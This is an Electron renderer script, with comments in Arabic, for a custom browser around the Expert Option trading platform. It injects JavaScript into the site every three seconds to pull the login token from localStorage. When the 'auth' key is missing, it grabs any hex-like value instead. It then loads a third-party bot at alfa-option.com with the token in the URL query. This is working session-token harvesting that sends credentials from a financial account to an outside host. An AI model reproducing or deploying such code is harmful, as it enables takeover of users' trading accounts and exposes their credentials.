// renderer.js — المتصفح المخصص
// يلتقط التوكن تلقائياً من Expert Option وينقله للبوت

const eoWebview = document.getElementById("eo-webview");
const botWebview = document.getElementById("bot-webview");
const eoStatus = document.getElementById("eo-status");
const botStatus = document.getElementById("bot-status");
const tokenStatus = document.getElementById("token-status");

let tokenFound = false;
let botLoaded = false;

// === رصد تحميل Expert Option ===
eoWebview.addEventListener("did-stop-loading", () => {
  eoStatus.textContent = "Expert Option: متصل";
  eoStatus.className = "badge emerald";
  startTokenHunt();
});

// === البحث التلقائي عن التوكن ===
function startTokenHunt() {
  if (tokenFound) return;
  tokenStatus.textContent = "جارٍ البحث عن التوكن…";

  // ابحث كل 3 ثوان
  const huntInterval = setInterval(async () => {
    if (tokenFound) {
      clearInterval(huntInterval);
      return;
    }

    // نفّذ كود داخل Expert Option
    const result = await eoWebview.executeJavaScript(`
      (function() {
        // ابحث في localStorage
        try {
          var auth = localStorage.getItem('auth');
          if (auth) {
            var parsed = JSON.parse(auth);
            if (parsed.token) return parsed.token;
          }
        } catch(e) {}

        // ابحث في كل القيم
        try {
          for (var i = 0; i < localStorage.length; i++) {
            var v = localStorage.getItem(localStorage.key(i));
            if (v && v.length >= 20 && v.length <= 80 && /^[a-f0-9]+$/i.test(v)) {
              return v;
            }
          }
        } catch(e) {}

        return null;
      })()
    `).catch(() => null);

    if (result && result.length >= 20) {
      tokenFound = true;
      clearInterval(huntInterval);
      tokenStatus.textContent = "✅ تم التقاط التوكن!";
      tokenStatus.className = "badge emerald";
      loadBot(result);
    }
  }, 3000);
}

// === تحميل البوت بالتوكن ===
function loadBot(token) {
  const botUrl = "https://alfa-option.com/?token=" + encodeURIComponent(token);
  botWebview.src = botUrl;
  botStatus.textContent = "البوت: جارٍ التحميل…";
  botStatus.className = "badge warn";

  botWebview.addEventListener("did-stop-loading", () => {
    if (!botLoaded) {
      botLoaded = true;
      botStatus.textContent = "البوت: يعمل ✅";
      botStatus.className = "badge emerald";
    }
  }, { once: true });
}

// === رصد الأخطاء ===
eoWebview.addEventListener("did-fail-load", (e) => {
  if (e.errorCode !== -3) {
    eoStatus.textContent = "Expert Option: خطأ";
    eoStatus.className = "badge red";
  }
});
